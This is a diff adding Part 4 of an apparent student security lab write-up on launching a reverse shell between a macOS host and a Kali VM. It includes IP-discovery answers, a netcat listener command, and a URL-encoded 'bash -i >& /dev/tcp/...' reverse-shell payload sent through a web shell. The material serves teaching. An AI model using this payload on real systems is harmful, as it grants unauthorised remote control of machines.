@@ -54,3 +54,50 @@ f. [Optional] Report on anything else interesting you discover.
 
 ****
 ### Part 3: Setup for part 4 ###
+****
+
+### Part 4: Launching a reverse shell ###
+
+a. What is the IP address of your Kali VM (the target machine)? How did you find out?
+
+> *The IP address of my Kali VM in 192.168.64.2. I found it by running the `ip a` command in my Kali terminal and inspecting the eth0 interface section*
+
+b. What are the IP addresses of your host OS (the attacking machine)? How did you find out? Which one should you use to communicate with Kali and why?
+
+> *I was able to obtain the IP address of my macOS by running the `ifconfig | grep inet` command in my terminal. Here is the list of present IP addressed:*
+>
+>```
+>	inet 127.0.0.1 netmask 0xff000000
+>	inet6 ::1 prefixlen 128 
+>	inet6 fe80::1%lo0 prefixlen 64 scopeid 0x1 
+>	inet6 fe80::a494:37ff:fecf:e5d5%ap1 prefixlen 64 scopeid 0xb 
+>	inet6 fe80::1c5b:29b2:d71e:3487%en0 prefixlen 64 secured scopeid 0xc 
+>	inet 10.133.0.214 netmask 0xffffe000 broadcast 10.133.31.255
+>	inet6 fe80::4c06:6dff:fe19:7ce2%awdl0 prefixlen 64 scopeid 0xd 
+>	inet6 fe80::4c06:6dff:fe19:7ce2%llw0 prefixlen 64 scopeid 0xe 
+>	inet6 fe80::a05f:d8e8:8da2:d878%utun0 prefixlen 64 scopeid 0xf 
+>	inet6 fe80::d48b:7e2a:ed1d:51fa%utun1 prefixlen 64 scopeid 0x10 
+>	inet6 fe80::9b38:4747:3b6c:256d%utun2 prefixlen 64 scopeid 0x11 
+>	inet6 fe80::ce81:b1c:bd2c:69e%utun3 prefixlen 64 scopeid 0x12 
+>	inet6 fe80::4942:7591:c656:402e%utun4 prefixlen 64 scopeid 0x13 
+>	inet6 fe80::7001:54e0:1851:ca5d%utun5 prefixlen 64 scopeid 0x14 
+>	inet6 fe80::4a03:9414:840e:86b2%utun6 prefixlen 64 scopeid 0x17 
+>	inet6 fe80::6905:89f9:1401:c108%utun7 prefixlen 64 scopeid 0x18 
+>	inet 192.168.64.1 netmask 0xffffff00 broadcast 192.168.64.255
+>	inet6 fe80::8494:37ff:fefc:8b64%bridge100 prefixlen 64 scopeid 0x16 
+>	inet6 fd6a:c3ab:6dda:5cc4:1c66:5278:ac7d:564 prefixlen 64 autoconf secured 
+>```
+> *The **IP 192.168.64.1** should be used to communicate with Kali, given that my Kali VM has the **IP address 192.168.64.2**. This makes both machines part of the same local network, allowing for direct communication.*
+
+c. On your host OS (the attacker), pick any port number between 5000 and 10000 and run nc -l -p YOUR_CHOSEN_PORT
+
+
+In a browser on your host machine, use your web shell to go to this crazy URL.
+http://KALI_IP/YOUR_WEBSHELL.php?command=bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/YOUR_HOST_OS_IP/YOUR_CHOSEN_PORT%200%3E%261%22
+            Note that "YOUR_WEBSHELL" should of course be replaced
+            by the name of your web shell you installed in the Apache2 home directory on
+            Kali during Part 3.
+            
+Go back and look at your nc -l -p terminal on your host OS (attacking machine). Do you have a shell now? Is it letting you execute commands on Kali? How do you know it's Kali?
+What are all those % codes in the URL you used?
+Write a brief description, probably including a diagram, explaining how this reverse shell is functioning.
